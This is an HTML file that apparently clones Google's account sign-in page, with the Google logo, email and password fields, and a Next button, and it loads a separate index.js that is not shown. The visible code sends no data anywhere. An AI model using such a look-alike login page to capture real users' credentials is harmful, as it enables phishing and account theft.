<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Google Form</title>
    <!-- CSS FILE -->
    <link rel="stylesheet" href="style.css" type="text/css" />

    <!-- GOOGLE FONT -->
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;700&display=swap"
      rel="stylesheet"
    />

    <!-- JQUERY -->
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  </head>
  <body>
    <section>
      <img src="./google.png" alt="google logo" width="150px" />
      <h1>Sign in</h1>
      <p>Use your Google Account</p>
      <div class="email">
        <input type="email" title="Please Enter Your Email or Phone" />
        <p class="email-placeholder">Email or phone</p>
      </div>
      <div class="password">
        <input type="password" title="Please Enter Your Password" />
        <p class="password-placeholder">Enter password</p>
      </div>
      <a href="#" class="forgot">Forgot email?</a>
      <div class="form-footer">
        <a href="#">Create account</a>
        <button>Next</button>
      </div>
    </section>
    <script src="./index.js" type="text/javascript"></script>
  </body>
</html>
